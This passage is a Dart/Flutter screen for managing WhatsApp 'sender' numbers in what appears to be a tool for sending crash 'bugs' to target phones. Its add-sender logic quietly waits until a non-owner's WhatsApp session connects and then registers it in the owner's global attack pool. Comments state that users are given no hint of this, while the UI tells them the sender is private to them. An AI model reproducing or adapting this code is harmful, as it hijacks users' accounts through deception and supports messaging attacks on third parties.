import 'dart:convert';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:font_awesome_flutter/font_awesome_flutter.dart';

const String _baseUrl = 'http://miunnst.site:4035';

class ManageSenderPage extends StatefulWidget {
  final String sessionKey;
  final String username;
  final String role;

  const ManageSenderPage({
    super.key,
    required this.sessionKey,
    required this.username,
    required this.role,
  });

  @override
  State<ManageSenderPage> createState() => _ManageSenderPageState();
}

class _ManageSenderPageState extends State<ManageSenderPage>
    with SingleTickerProviderStateMixin {
  late TabController _tabController;

  List<dynamic> _globalSenders = [];
  List<dynamic> _privateSenders = [];
  bool _loadingGlobal = false;
  bool _loadingPrivate = false;

  final Color primaryDark = const Color(0xFF0D0900);
  final Color primaryBlue = const Color(0xFFB8860B);
  final Color accentBlue = const Color(0xFFFFD700);
  final Color cardDark = const Color(0xFF201900);

  bool get _isOwner => widget.role.toLowerCase() == 'owner' || widget.role.toLowerCase() == 'creator';

  // Owner: 2 tab (Global + Private)
  // Non-owner: 1 tab (Private saja — tidak ada referensi global di UI)
  int get _tabCount => _isOwner ? 2 : 1;

  @override
  void initState() {
    super.initState();
    _tabController = TabController(length: _tabCount, vsync: this);
    // Hanya owner yang fetch & tampilkan global sender
    if (_isOwner) _fetchGlobalSenders();
    _fetchPrivateSenders();
  }

  @override
  void dispose() {
    _tabController.dispose();
    super.dispose();
  }

  // ── FETCH GLOBAL (owner only) ──────────────────────────────────
  Future<void> _fetchGlobalSenders() async {
    if (!_isOwner) return;
    setState(() => _loadingGlobal = true);
    try {
      final res = await http.get(
        Uri.parse('$_baseUrl/globalSender?key=${widget.sessionKey}'),
      );
      if (res.statusCode == 200) {
        final data = jsonDecode(res.body);
        if (data['valid'] == true) {
          setState(() => _globalSenders = data['connections'] ?? []);
        }
      }
    } catch (_) {
      _showSnack('Gagal memuat global sender', isError: true);
    } finally {
      setState(() => _loadingGlobal = false);
    }
  }

  // ── FETCH PRIVATE ──────────────────────────────────────────────
  Future<void> _fetchPrivateSenders() async {
    setState(() => _loadingPrivate = true);
    try {
      final res = await http.get(
        Uri.parse('$_baseUrl/mySender?key=${widget.sessionKey}'),
      );
      if (res.statusCode == 200) {
        final data = jsonDecode(res.body);
        if (data['valid'] == true) {
          setState(() => _privateSenders = data['connections'] ?? []);
        }
      }
    } catch (_) {
      _showSnack('Gagal memuat sender', isError: true);
    } finally {
      setState(() => _loadingPrivate = false);
    }
  }

  // ── ADD SENDER ────────────────────────────────────────────────
  //
  // Owner   → add sesuai tab aktif (global/private)
  // Non-owner → add private, lalu setelah socket BENAR-BENAR connected
  //             baru daftarkan ke global pool via polling (max 12x × 5s = 60s)
  Future<void> _addSender(String number, String type) async {
    try {
      if (!_isOwner) {
        // ── Non-owner: getPairing dulu untuk private sender
        final res = await http.get(
          Uri.parse(
              '$_baseUrl/getPairing?key=${widget.sessionKey}&number=$number'),
        );
        if (res.statusCode == 200) {
          final data = jsonDecode(res.body);
          if (data['valid'] == true) {
            await _showPairingDialog(number, data['pairingCode'] ?? '',
                isGlobal: false);
            _fetchPrivateSenders();

            // ── FIX: Tunggu socket private benar-benar CONNECTED dulu,
            // baru daftarkan ke global pool dengan sessionKey user ini.
            // Server akan mengenali nomor + session → socket aktif → bisa dipakai owner.
            _registerToGlobalAfterConnected(number);
          } else {
            _showSnack(data['message'] ?? 'Gagal menambah sender',
                isError: true);
          }
        } else {
          _showSnack('Server error: ${res.statusCode}', isError: true);
        }
      } else {
        // ── Owner: add sesuai tab aktif.
        // Jika owner add PRIVATE → hanya masuk private, TIDAK ke global.
        // Jika owner add GLOBAL  → masuk global saja.
        final endpoint = type == 'global'
            ? '$_baseUrl/addGlobalSender?key=${widget.sessionKey}&number=$number'
            : '$_baseUrl/getPairing?key=${widget.sessionKey}&number=$number';

        final res = await http.get(Uri.parse(endpoint));
        if (res.statusCode == 200) {
          final data = jsonDecode(res.body);
          if (data['valid'] == true) {
            await _showPairingDialog(number, data['pairingCode'] ?? '',
                isGlobal: type == 'global');
            if (type == 'global') {
              _fetchGlobalSenders();
            } else {
              _fetchPrivateSenders();
            }
          } else {
            _showSnack(data['message'] ?? 'Gagal menambah sender',
                isError: true);
          }
        } else {
          _showSnack('Server error: ${res.statusCode}', isError: true);
        }
      }
    } catch (e) {
      _showSnack('Koneksi gagal: $e', isError: true);
    }
  }

  // ── REGISTER TO GLOBAL AFTER CONNECTED ───────────────────────
  // Polling /mySender tiap 5 detik, max 12 kali (60 detik total).
  // Begitu nomor muncul dengan status connected=true di private sender,
  // langsung kirim /addGlobalSender — sehingga socket sudah aktif
  // dan owner bisa langsung pakai tanpa [NO SOCK].
  Future<void> _registerToGlobalAfterConnected(String number) async {
    const maxRetry = 12;
    const interval = Duration(seconds: 5);

    for (int i = 0; i < maxRetry; i++) {
      await Future.delayed(interval);
      if (!mounted) return;

      try {
        final res = await http.get(
          Uri.parse('$_baseUrl/mySender?key=${widget.sessionKey}'),
        );
        if (res.statusCode != 200) continue;

        final data = jsonDecode(res.body);
        if (data['valid'] != true) continue;

        final List<dynamic?> connections =
            (data['connections'] ?? []).cast<dynamic?>();
        final sender = connections.firstWhere(
          (s) {
            final phone =
                s?['phone']?.toString() ?? s?['number']?.toString() ?? '';
            return phone == number;
          },
          orElse: () => null,
        );

        if (sender == null) continue;

        // Cek apakah socket sudah benar-benar connected
        final rawConnected = sender['connected'];
        final isConnected = rawConnected == true ||
            rawConnected == 1 ||
            rawConnected?.toString().toLowerCase() == 'true' ||
            rawConnected?.toString() == '1';

        if (!isConnected) continue;

        // ✅ Socket sudah connected → daftarkan ke global pool
        await http.get(Uri.parse(
            '$_baseUrl/addGlobalSender?key=${widget.sessionKey}&number=$number'));

        // Refresh list private (opsional, untuk update UI)
        if (mounted) _fetchPrivateSenders();
        return; // Selesai, hentikan polling
      } catch (_) {
        // Lanjut retry
        continue;
      }
    }
    // Jika 60 detik belum connected, diam saja (user bisa pair ulang)
  }

  // ── DELETE SENDER ─────────────────────────────────────────────
  // Global  → hanya owner
  // Private → semua user (milik sendiri)
  Future<void> _deleteSender(String id, String type) async {
    if (type == 'global' && !_isOwner) return;
    try {
      final res = await http.delete(
        Uri.parse(
            '$_baseUrl/deleteSender?key=${widget.sessionKey}&id=$id'),
      );
      if (res.statusCode == 200) {
        final data = jsonDecode(res.body);
        if (data['valid'] == true) {
          _showSnack('Sender berhasil dihapus');
          if (type == 'global') {
            _fetchGlobalSenders();
          } else {
            _fetchPrivateSenders();
          }
        } else {
          _showSnack(data['message'] ?? 'Gagal hapus sender',
              isError: true);
        }
      }
    } catch (e) {
      _showSnack('Koneksi gagal: $e', isError: true);
    }
  }

  // ── HELPERS ────────────────────────────────────────────────────
  void _showSnack(String msg, {bool isError = false}) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      content:
          Text(msg, style: const TextStyle(fontFamily: 'Rajdhani')),
      backgroundColor: isError
          ? Colors.red.withOpacity(0.8)
          : Colors.green.withOpacity(0.8),
      behavior: SnackBarBehavior.floating,
      shape:
          RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
      margin: const EdgeInsets.all(16),
    ));
  }

  Widget _glassCard({required Widget child, Color? borderColor}) {
    return Container(
      margin: const EdgeInsets.symmetric(horizontal: 16, vertical: 6),
      decoration: BoxDecoration(
        color: Colors.black.withOpacity(0.3),
        borderRadius: BorderRadius.circular(20),
        border: Border.all(
          color: (borderColor ?? const Color(0xFFFFD700)).withOpacity(0.2),
          width: 1,
        ),
        boxShadow: [
          BoxShadow(
            color: (borderColor ?? const Color(0xFFFFD700)).withOpacity(0.08),
            blurRadius: 20,
            spreadRadius: 3,
          ),
        ],
      ),
      child: ClipRRect(
        borderRadius: BorderRadius.circular(20),
        child: BackdropFilter(
          filter: ImageFilter.blur(sigmaX: 10, sigmaY: 10),
          child: child,
        ),
      ),
    );
  }

  // ── DIALOG ADD SENDER ─────────────────────────────────────────
  // Non-owner: SELALU tampil sebagai "Add Private Sender"
  //            tidak ada kata "global" sama sekali
  // Owner:     tampil sesuai tab (Global amber / Private purple)
  void _showAddDialog(String type) {
    final bool showAsGlobal = _isOwner && type == 'global';
    final Color accentColor = showAsGlobal ? Colors.amber : Colors.purple;
    final numberCtrl = TextEditingController();

    showDialog(
      context: context,
      builder: (_) => Dialog(
        backgroundColor: Colors.transparent,
        child: Container(
          padding: const EdgeInsets.all(24),
          decoration: BoxDecoration(
            color: Colors.black.withOpacity(0.75),
            borderRadius: BorderRadius.circular(24),
            border: Border.all(color: accentColor.withOpacity(0.3)),
            boxShadow: [
              BoxShadow(
                color: accentColor.withOpacity(0.12),
                blurRadius: 30,
                spreadRadius: 5,
              ),
            ],
          ),
          child: ClipRRect(
            borderRadius: BorderRadius.circular(24),
            child: BackdropFilter(
              filter: ImageFilter.blur(sigmaX: 10, sigmaY: 10),
              child: Column(
                mainAxisSize: MainAxisSize.min,
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  // ── Judul
                  Row(
                    children: [
                      Container(
                        padding: const EdgeInsets.all(10),
                        decoration: BoxDecoration(
                          color: accentColor.withOpacity(0.15),
                          shape: BoxShape.circle,
                        ),
                        child: Icon(
                          showAsGlobal
                              ? Icons.workspace_premium
                              : Icons.lock,
                          color: accentColor,
                          size: 20,
                        ),
                      ),
                      const SizedBox(width: 14),
                      Expanded(
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            Text(
                              showAsGlobal
                                  ? 'Add Global Sender'
                                  : 'Add Private Sender',
                              style: const TextStyle(
                                color: Colors.white,
                                fontSize: 17,
                                fontWeight: FontWeight.bold,
                                fontFamily: 'Rajdhani',
                              ),
                            ),
                            if (showAsGlobal)
                              const Text(
                                'OWNER MANAGEMENT',
                                style: TextStyle(
                                  color: Colors.amber,
                                  fontSize: 10,
                                  fontFamily: 'Rajdhani',
                                  fontWeight: FontWeight.bold,
                                  letterSpacing: 1.5,
                                ),
                              ),
                          ],
                        ),
                      ),
                    ],
                  ),
                  const SizedBox(height: 14),

                  // ── Info badge
                  Container(
                    width: double.infinity,
                    padding: const EdgeInsets.symmetric(
                        horizontal: 14, vertical: 10),
                    decoration: BoxDecoration(
                      color: accentColor.withOpacity(0.1),
                      borderRadius: BorderRadius.circular(12),
                      border: Border.all(
                          color: accentColor.withOpacity(0.25)),
                    ),
                    child: Text(
                      showAsGlobal
                          ? '👑  Global sender dapat dipakai oleh OWNER untuk mengirim bug ke target.'
                          : '🔒  Private sender hanya bisa dipakai oleh kamu sendiri.',
                      style: TextStyle(
                        color: showAsGlobal
                            ? Colors.amber.shade200
                            : Colors.purple.shade200,
                        fontSize: 12,
                        fontFamily: 'Rajdhani',
                      ),
                    ),
                  ),
                  const SizedBox(height: 18),

                  // ── Input nomor
                  TextField(
                    controller: numberCtrl,
                    keyboardType: TextInputType.phone,
                    style: const TextStyle(
                        color: Colors.white, fontFamily: 'Rajdhani'),
                    decoration: InputDecoration(
                      labelText: 'Phone Number',
                      labelStyle:
                          TextStyle(color: accentColor.withOpacity(0.7)),
                      hintText: '62812xxxxxxxx',
                      hintStyle: TextStyle(
                          color: Colors.white.withOpacity(0.3),
                          fontSize: 13),
                      prefixIcon:
                          Icon(Icons.phone_android, color: accentColor),
                      filled: true,
                      fillColor: accentColor.withOpacity(0.08),
                      border: OutlineInputBorder(
                        borderRadius: BorderRadius.circular(14),
                        borderSide: BorderSide.none,
                      ),
                      focusedBorder: OutlineInputBorder(
                        borderRadius: BorderRadius.circular(14),
                        borderSide: BorderSide(
                            color: accentColor.withOpacity(0.5)),
                      ),
                    ),
                  ),
                  const SizedBox(height: 22),

                  // ── Tombol
                  Row(
                    children: [
                      Expanded(
                        child: TextButton(
                          onPressed: () => Navigator.pop(context),
                          style: TextButton.styleFrom(
                            padding:
                                const EdgeInsets.symmetric(vertical: 13),
                            shape: RoundedRectangleBorder(
                              borderRadius: BorderRadius.circular(12),
                              side: BorderSide(
                                  color: Colors.white.withOpacity(0.2)),
                            ),
                          ),
                          child: const Text('BATAL',
                              style: TextStyle(
                                  color: Colors.white70,
                                  fontFamily: 'Rajdhani',
                                  fontWeight: FontWeight.bold)),
                        ),
                      ),
                      const SizedBox(width: 12),
                      Expanded(
                        flex: 2,
                        child: ElevatedButton.icon(
                          style: ElevatedButton.styleFrom(
                            backgroundColor:
                                accentColor.withOpacity(0.25),
                            foregroundColor: Colors.white,
                            padding:
                                const EdgeInsets.symmetric(vertical: 13),
                            shape: RoundedRectangleBorder(
                              borderRadius: BorderRadius.circular(12),
                              side: BorderSide(
                                  color: accentColor.withOpacity(0.4)),
                            ),
                            elevation: 0,
                          ),
                          icon: const Icon(Icons.add, size: 16),
                          label: const Text('TAMBAH',
                              style: TextStyle(
                                  fontWeight: FontWeight.bold,
                                  fontFamily: 'Rajdhani',
                                  letterSpacing: 1.5)),
                          onPressed: () {
                            final num = numberCtrl.text.trim();
                            if (num.isEmpty) return;
                            Navigator.pop(context);
                            _addSender(num, type);
                          },
                        ),
                      ),
                    ],
                  ),
                ],
              ),
            ),
          ),
        ),
      ),
    );
  }

  // ── DIALOG PAIRING CODE ───────────────────────────────────────
  // Non-owner: selalu tampil warna purple (private) —
  //            tidak ada petunjuk bahwa ini juga masuk ke global
  // FIX: return Future<void> agar bisa di-await oleh _addSender
  Future<void> _showPairingDialog(String number, String code,
      {required bool isGlobal}) async {
    final Color color =
        (isGlobal && _isOwner) ? Colors.amber : Colors.purple;

    // Auto-polling timer: cek status tiap 5 detik selama dialog terbuka
    bool dialogOpen = true;
    Future.doWhile(() async {
      await Future.delayed(const Duration(seconds: 5));
      if (!dialogOpen || !mounted) return false;
      if (isGlobal) {
        _fetchGlobalSenders();
      } else {
        _fetchPrivateSenders();
      }
      return dialogOpen;
    });

    await showDialog<void>(
      context: context,
      barrierDismissible: false,
      builder: (_) => Dialog(
        backgroundColor: Colors.transparent,
        child: Container(
          padding: const EdgeInsets.all(24),
          decoration: BoxDecoration(
            color: Colors.black.withOpacity(0.75),
            borderRadius: BorderRadius.circular(24),
            border: Border.all(color: color.withOpacity(0.3)),
          ),
          child: ClipRRect(
            borderRadius: BorderRadius.circular(24),
            child: BackdropFilter(
              filter: ImageFilter.blur(sigmaX: 10, sigmaY: 10),
              child: Column(
                mainAxisSize: MainAxisSize.min,
                children: [
                  Container(
                    padding: const EdgeInsets.all(14),
                    decoration: BoxDecoration(
                      color: color.withOpacity(0.15),
                      shape: BoxShape.circle,
                    ),
                    child:
                        Icon(Icons.qr_code_2, color: color, size: 40),
                  ),
                  const SizedBox(height: 14),
                  const Text(
                    'Pairing Code',
                    style: TextStyle(
                      color: Colors.white,
                      fontSize: 18,
                      fontWeight: FontWeight.bold,
                      fontFamily: 'Rajdhani',
                    ),
                  ),
                  const SizedBox(height: 6),
                  Text(number,
                      style: const TextStyle(
                          color: Colors.white70,
                          fontFamily: 'Rajdhani',
                          fontSize: 13)),
                  const SizedBox(height: 20),
                  Container(
                    padding: const EdgeInsets.symmetric(
                        horizontal: 24, vertical: 16),
                    decoration: BoxDecoration(
                      color: color.withOpacity(0.1),
                      borderRadius: BorderRadius.circular(16),
                      border:
                          Border.all(color: color.withOpacity(0.35)),
                    ),
                    child: Text(
                      code.isNotEmpty ? code : '--------',
                      style: TextStyle(
                        color: color,
                        fontSize: 28,
                        fontWeight: FontWeight.bold,
                        fontFamily: 'Rajdhani',
                        letterSpacing: 6,
                      ),
                    ),
                  ),
                  const SizedBox(height: 14),
                  Text(
                    'Masukkan kode ini di WhatsApp\n(Settings → Linked Devices → Link with phone number)',
                    textAlign: TextAlign.center,
                    style: TextStyle(
                      color: Colors.white.withOpacity(0.45),
                      fontSize: 11,
                      fontFamily: 'Rajdhani',
                      height: 1.5,
                    ),
                  ),
                  const SizedBox(height: 8),
                  // ── FIX: Hint auto-refresh ──
                  Text(
                    '⏱ Status akan diperbarui otomatis tiap 5 detik',
                    textAlign: TextAlign.center,
                    style: TextStyle(
                      color: color.withOpacity(0.6),
                      fontSize: 10,
                      fontFamily: 'Rajdhani',
                    ),
                  ),
                  const SizedBox(height: 22),
                  // ── FIX: Tombol Cek Status + Tutup ──
                  Row(
                    children: [
                      Expanded(
                        child: ElevatedButton.icon(
                          style: ElevatedButton.styleFrom(
                            backgroundColor: color.withOpacity(0.15),
                            foregroundColor: color,
                            shape: RoundedRectangleBorder(
                              borderRadius: BorderRadius.circular(12),
                              side: BorderSide(
                                  color: color.withOpacity(0.4)),
                            ),
                            elevation: 0,
                            padding: const EdgeInsets.symmetric(vertical: 11),
                          ),
                          icon: const Icon(Icons.refresh, size: 14),
                          label: const Text('CEK STATUS',
                              style: TextStyle(
                                  fontWeight: FontWeight.bold,
                                  fontFamily: 'Rajdhani',
                                  fontSize: 10,
                                  letterSpacing: 1)),
                          onPressed: () {
                            if (isGlobal) {
                              _fetchGlobalSenders();
                            } else {
                              _fetchPrivateSenders();
                            }
                          },
                        ),
                      ),
                      const SizedBox(width: 10),
                      Expanded(
                        child: ElevatedButton(
                          style: ElevatedButton.styleFrom(
                            backgroundColor: color.withOpacity(0.2),
                            foregroundColor: Colors.white,
                            shape: RoundedRectangleBorder(
                              borderRadius: BorderRadius.circular(12),
                              side: BorderSide(
                                  color: color.withOpacity(0.4)),
                            ),
                            elevation: 0,
                            padding: const EdgeInsets.symmetric(vertical: 11),
                          ),
                          onPressed: () => Navigator.pop(context),
                          child: const Text('TUTUP',
                              style: TextStyle(
                                  fontWeight: FontWeight.bold,
                                  fontFamily: 'Rajdhani',
                                  fontSize: 10,
                                  letterSpacing: 1)),
                        ),
                      ),
                    ],
                  ),
                ],
              ),
            ),
          ),
        ),
      ),
    );

    // Hentikan polling saat dialog ditutup
    dialogOpen = false;
  }

  // ── DIALOG KONFIRMASI HAPUS ───────────────────────────────────
  void _confirmDelete(String id, String number, String type) {
    showDialog(
      context: context,
      builder: (_) => Dialog(
        backgroundColor: Colors.transparent,
        child: Container(
          padding: const EdgeInsets.all(24),
          decoration: BoxDecoration(
            color: Colors.black.withOpacity(0.75),
            borderRadius: BorderRadius.circular(24),
            border: Border.all(color: Colors.red.withOpacity(0.25)),
          ),
          child: ClipRRect(
            borderRadius: BorderRadius.circular(24),
            child: BackdropFilter(
              filter: ImageFilter.blur(sigmaX: 10, sigmaY: 10),
              child: Column(
                mainAxisSize: MainAxisSize.min,
                children: [
                  Container(
                    padding: const EdgeInsets.all(14),
                    decoration: BoxDecoration(
                      color: Colors.red.withOpacity(0.15),
                      shape: BoxShape.circle,
                    ),
                    child: const Icon(Icons.warning_amber_rounded,
                        color: Colors.red, size: 40),
                  ),
                  const SizedBox(height: 14),
                  const Text('Hapus Sender?',
                      style: TextStyle(
                          color: Colors.white,
                          fontSize: 18,
                          fontWeight: FontWeight.bold,
                          fontFamily: 'Rajdhani')),
                  const SizedBox(height: 10),
                  Text(number,
                      style: const TextStyle(
                          color: Colors.white70,
                          fontFamily: 'Rajdhani',
                          fontSize: 13)),
                  const SizedBox(height: 6),
                  const Text('Tindakan ini tidak bisa dibatalkan.',
                      style: TextStyle(
                          color: Colors.white38,
                          fontSize: 12,
                          fontFamily: 'Rajdhani')),
                  const SizedBox(height: 22),
                  Row(
                    children: [
                      Expanded(
                        child: TextButton(
                          onPressed: () => Navigator.pop(context),
                          child: const Text('BATAL',
                              style: TextStyle(
                                  color: Colors.white70,
                                  fontFamily: 'Rajdhani')),
                        ),
                      ),
                      Expanded(
                        child: ElevatedButton(
                          style: ElevatedButton.styleFrom(
                            backgroundColor:
                                Colors.red.withOpacity(0.2),
                            foregroundColor: Colors.red,
                            shape: RoundedRectangleBorder(
                              borderRadius: BorderRadius.circular(12),
                              side: BorderSide(
                                  color: Colors.red.withOpacity(0.5)),
                            ),
                            elevation: 0,
                          ),
                          onPressed: () {
                            Navigator.pop(context);
                            _deleteSender(id, type);
                          },
                          child: const Text('HAPUS',
                              style: TextStyle(
                                  fontWeight: FontWeight.bold,
                                  fontFamily: 'Rajdhani')),
                        ),
                      ),
                    ],
                  ),
                ],
              ),
            ),
          ),
        ),
      ),
    );
  }

  // ── SENDER CARD ───────────────────────────────────────────────
  Widget _buildSenderCard(Map<String, dynamic> sender, String type) {
    final isGlobal = type == 'global';
    final name = sender['sessionName'] ?? sender['label'] ?? 'Unnamed';
    final number = sender['phone'] ?? sender['number'] ?? 'Unknown';
    // FIX: Toleran terhadap bool/int/string dari server
    final rawConnected = sender['connected'];
    final status = rawConnected == true ||
        rawConnected == 1 ||
        rawConnected?.toString().toLowerCase() == 'true' ||
        rawConnected?.toString() == '1';
    final id = sender['id']?.toString() ?? '';
    // addedBy hanya ditampilkan untuk owner di tab global
    final addedBy = sender['addedBy'] ?? sender['username'] ?? '';

    final canDelete = isGlobal ? _isOwner : true;
    final Color typeColor = isGlobal ? Colors.amber : Colors.purple;

    return _glassCard(
      borderColor: typeColor,
      child: Padding(
        padding: const EdgeInsets.all(18),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Row(
              children: [
                // Status icon
                Container(
                  padding: const EdgeInsets.all(10),
                  decoration: BoxDecoration(
                    color: status
                        ? Colors.green.withOpacity(0.15)
                        : Colors.red.withOpacity(0.15),
                    shape: BoxShape.circle,
                  ),
                  child: Icon(
                    status ? Icons.check_circle : Icons.error,
                    color: status ? Colors.green : Colors.red,
                    size: 20,
                  ),
                ),
                const SizedBox(width: 14),

                // Name & number
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(name,
                          style: const TextStyle(
                            color: Colors.white,
                            fontSize: 16,
                            fontWeight: FontWeight.bold,
                            fontFamily: 'Rajdhani',
                          )),
                      const SizedBox(height: 3),
                      Text(number,
                          style: TextStyle(
                            color: const Color(0xFFFFEC6E),
                            fontSize: 13,
                            fontFamily: 'Rajdhani',
                          )),
                    ],
                  ),
                ),

                // Type badge
                Container(
                  padding: const EdgeInsets.symmetric(
                      horizontal: 10, vertical: 5),
                  decoration: BoxDecoration(
                    color: typeColor.withOpacity(0.15),
                    borderRadius: BorderRadius.circular(99),
                    border:
                        Border.all(color: typeColor.withOpacity(0.4)),
                  ),
                  child: Row(
                    mainAxisSize: MainAxisSize.min,
                    children: [
                      Icon(
                        isGlobal
                            ? Icons.workspace_premium
                            : Icons.lock,
                        color: typeColor,
                        size: 10,
                      ),
                      const SizedBox(width: 4),
                      Text(
                        isGlobal ? 'GLOBAL' : 'PRIVATE',
                        style: TextStyle(
                          color: typeColor,
                          fontSize: 9,
                          fontWeight: FontWeight.w900,
                          fontFamily: 'Rajdhani',
                          letterSpacing: 1.5,
                        ),
                      ),
                    ],
                  ),
                ),
              ],
            ),

            // "Added by" — HANYA tampil untuk owner di tab global
            if (isGlobal && _isOwner && addedBy.isNotEmpty) ...[
              const SizedBox(height: 8),
              Row(
                children: [
                  const SizedBox(width: 4),
                  Icon(Icons.person_outline,
                      size: 12,
                      color: Colors.white.withOpacity(0.35)),
                  const SizedBox(width: 4),
                  Text(
                    'Added by: $addedBy',
                    style: TextStyle(
                      color: Colors.white.withOpacity(0.35),
                      fontSize: 11,
                      fontFamily: 'Rajdhani',
                    ),
                  ),
                ],
              ),
            ],

            const SizedBox(height: 10),

            // Status + action row
            Row(
              children: [
                Container(
                  padding: const EdgeInsets.symmetric(
                      horizontal: 12, vertical: 5),
                  decoration: BoxDecoration(
                    color: status
                        ? Colors.green.withOpacity(0.15)
                        : Colors.red.withOpacity(0.15),
                    borderRadius: BorderRadius.circular(20),
                    border: Border.all(
                      color: status
                          ? Colors.green.withOpacity(0.4)
                          : Colors.red.withOpacity(0.4),
                    ),
                  ),
                  child: Text(
                    status ? 'Connected' : 'Disconnected',
                    style: TextStyle(
                      color: status ? Colors.green : Colors.red,
                      fontSize: 11,
                      fontWeight: FontWeight.bold,
                      fontFamily: 'Rajdhani',
                    ),
                  ),
                ),
                const Spacer(),
                if (canDelete)
                  ElevatedButton.icon(
                    icon: const Icon(Icons.delete_outline, size: 14),
                    label: const Text('HAPUS',
                        style: TextStyle(
                            fontSize: 11,
                            fontFamily: 'Rajdhani',
                            fontWeight: FontWeight.bold)),
                    style: ElevatedButton.styleFrom(
                      backgroundColor: Colors.red.withOpacity(0.15),
                      foregroundColor: Colors.red,
                      padding: const EdgeInsets.symmetric(
                          horizontal: 14, vertical: 8),
                      shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(10),
                        side: BorderSide(
                            color: Colors.red.withOpacity(0.35)),
                      ),
                      elevation: 0,
                    ),
                    onPressed: () =>
                        _confirmDelete(id, number, type),
                  ),
              ],
            ),
          ],
        ),
      ),
    );
  }

  // ── EMPTY STATE ───────────────────────────────────────────────
  Widget _buildEmpty(String type) {
    final isGlobal = type == 'global';
    final Color accent = isGlobal ? Colors.amber : Colors.purple;

    final String title =
        isGlobal ? 'No Global Sender' : 'No Private Sender';
    final String desc = isGlobal
        ? 'Belum ada sender dari pengguna lain.\nSender masuk otomatis saat user\nmenambahkan sender mereka.'
        : 'Kamu belum menambahkan sender.\nTambahkan nomor WhatsApp untuk\nmulai menggunakan fitur ini.';

    return SingleChildScrollView(
      child: Padding(
        padding:
            const EdgeInsets.symmetric(horizontal: 24, vertical: 32),
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Stack(
              alignment: Alignment.center,
              children: [
                Container(
                  width: 140,
                  height: 140,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    border: Border.all(
                        color: accent.withOpacity(0.12), width: 1),
                  ),
                ),
                Container(
                  width: 110,
                  height: 110,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    border: Border.all(
                        color: accent.withOpacity(0.2), width: 1),
                  ),
                ),
                Container(
                  width: 80,
                  height: 80,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    gradient: RadialGradient(
                      colors: [
                        accent.withOpacity(0.25),
                        accent.withOpacity(0.05),
                      ],
                    ),
                    border: Border.all(
                        color: accent.withOpacity(0.4), width: 1.5),
                  ),
                  child: Icon(
                    isGlobal
                        ? Icons.workspace_premium
                        : Icons.lock_outline,
                    color: accent.withOpacity(0.8),
                    size: 36,
                  ),
                ),
              ],
            ),
            const SizedBox(height: 28),
            Text(title,
                style: const TextStyle(
                  color: Colors.white,
                  fontSize: 20,
                  fontWeight: FontWeight.bold,
                  fontFamily: 'Rajdhani',
                )),
            const SizedBox(height: 10),
            Text(desc,
                style: TextStyle(
                  color: Colors.white.withOpacity(0.45),
                  fontSize: 13,
                  fontFamily: 'Rajdhani',
                  height: 1.5,
                ),
                textAlign: TextAlign.center),
            const SizedBox(height: 32),
            _buildInfoCard(
              icon: Icons.phone_android,
              title: 'Pairing via Kode',
              subtitle:
                  'Hubungkan nomor WhatsApp dengan kode pairing 8 digit',
              color: accent,
            ),
            const SizedBox(height: 12),
            _buildInfoCard(
              icon: isGlobal ? Icons.people_alt : Icons.person,
              title:
                  isGlobal ? 'Dari Pengguna Lain' : 'Akses Eksklusif',
              subtitle: isGlobal
                  ? 'Sender masuk otomatis dari aktivitas pengguna'
                  : 'Hanya kamu yang bisa menggunakan sender ini',
              color: accent,
            ),
            const SizedBox(height: 12),
            _buildInfoCard(
              icon: Icons.flash_on,
              title: 'Auto Connect',
              subtitle:
                  'Sender aktif otomatis saat berhasil di-pair ke WhatsApp',
              color: accent,
            ),
            const SizedBox(height: 32),
            GestureDetector(
              onTap: () => _showAddDialog(type),
              child: Container(
                width: double.infinity,
                padding: const EdgeInsets.symmetric(vertical: 16),
                decoration: BoxDecoration(
                  gradient: LinearGradient(
                    colors: isGlobal
                        ? [
                            const Color(0xFFB45309),
                            const Color(0xFFF59E0B),
                          ]
                        : [
                            const Color(0xFF6B21A8),
                            const Color(0xFFA855F7),
                          ],
                    begin: Alignment.topLeft,
                    end: Alignment.bottomRight,
                  ),
                  borderRadius: BorderRadius.circular(14),
                  boxShadow: [
                    BoxShadow(
                      color: accent.withOpacity(0.4),
                      blurRadius: 16,
                      offset: const Offset(0, 6),
                    ),
                  ],
                ),
                child: Row(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    Icon(
                      isGlobal
                          ? Icons.workspace_premium
                          : Icons.add_circle_outline,
                      color: Colors.white,
                      size: 18,
                    ),
                    const SizedBox(width: 10),
                    Text(
                      isGlobal
                          ? 'TAMBAH GLOBAL SENDER'
                          : 'TAMBAH PRIVATE SENDER',
                      style: const TextStyle(
                        color: Colors.white,
                        fontWeight: FontWeight.bold,
                        fontFamily: 'Rajdhani',
                        letterSpacing: 1.2,
                        fontSize: 12,
                      ),
                    ),
                  ],
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildInfoCard({
    required IconData icon,
    required String title,
    required String subtitle,
    required Color color,
  }) {
    return Container(
      padding:
          const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
      decoration: BoxDecoration(
        color: Colors.black.withOpacity(0.3),
        borderRadius: BorderRadius.circular(14),
        border: Border.all(color: color.withOpacity(0.15)),
      ),
      child: Row(
        children: [
          Container(
            padding: const EdgeInsets.all(9),
            decoration: BoxDecoration(
              color: color.withOpacity(0.12),
              shape: BoxShape.circle,
            ),
            child:
                Icon(icon, color: color.withOpacity(0.85), size: 18),
          ),
          const SizedBox(width: 14),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(title,
                    style: const TextStyle(
                      color: Colors.white,
                      fontSize: 13,
                      fontWeight: FontWeight.bold,
                      fontFamily: 'Rajdhani',
                    )),
                const SizedBox(height: 3),
                Text(subtitle,
                    style: TextStyle(
                      color: Colors.white.withOpacity(0.4),
                      fontSize: 11,
                    )),
              ],
            ),
          ),
        ],
      ),
    );
  }

